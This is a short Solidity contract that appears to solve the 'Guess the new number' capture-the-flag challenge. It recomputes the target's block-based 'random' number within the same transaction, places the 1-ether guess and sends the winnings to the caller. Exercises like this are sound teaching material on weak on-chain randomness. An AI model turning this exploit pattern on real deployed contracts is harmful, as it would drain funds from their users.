pragma solidity ^0.6.0;

import "interfaces/IGuessTheNewNumberChallenge.sol";

contract GuessTheNewNumberAttack {
    function attack(IGuessTheNewNumberChallenge challengeContract)
        public
        payable
    {
        require(msg.value == 1 ether);
        uint8 answer = uint8(
            uint256(
                keccak256(
                    abi.encodePacked(
                        blockhash(block.number - 1),
                        block.timestamp
                    )
                )
            )
        );
        challengeContract.guess{value: msg.value}(answer);
        msg.sender.transfer(address(this).balance);
    }

    receive() external payable {}
}
